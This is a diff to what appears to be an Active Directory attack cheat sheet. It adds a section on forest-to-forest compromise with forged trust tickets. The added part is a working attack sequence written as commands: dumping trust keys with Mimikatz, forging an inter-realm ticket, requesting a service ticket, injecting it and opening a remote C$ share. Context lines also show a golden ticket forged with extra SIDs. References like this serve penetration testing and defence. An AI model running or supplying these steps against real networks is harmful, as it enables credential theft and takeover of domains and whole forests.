@@ -52,6 +52,7 @@
       - [WriteDACL](#writedacl)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
+    - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
@@ -1241,6 +1242,37 @@ Prerequisite:
     ```powershell
     kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
     ```
+
+### Forest to Forest Compromise - Trust Ticket
+
+#### Dumping trust passwords (trust keys)
+
+> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
+
+```powershell
+lsadump::trust /patch
+
+or find the TRUST_NAME$ machine account hash
+```
+
+#### Create a forged trust ticket (inter-realm TGT) using Mimikatz
+
+```powershell
+mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
+```
+
+#### Use the Trust Ticket file to get a TGS for the targeted service
+
+```powershell
+./asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
+```
+
+Inject the TGS file and access the targeted service with the spoofed rights.
+
+```powershell
+kirbikator lsa .\ticket.kirbi
+ls \\machine.domain.local\c$
+```
 
 ### Kerberos Unconstrained Delegation
 
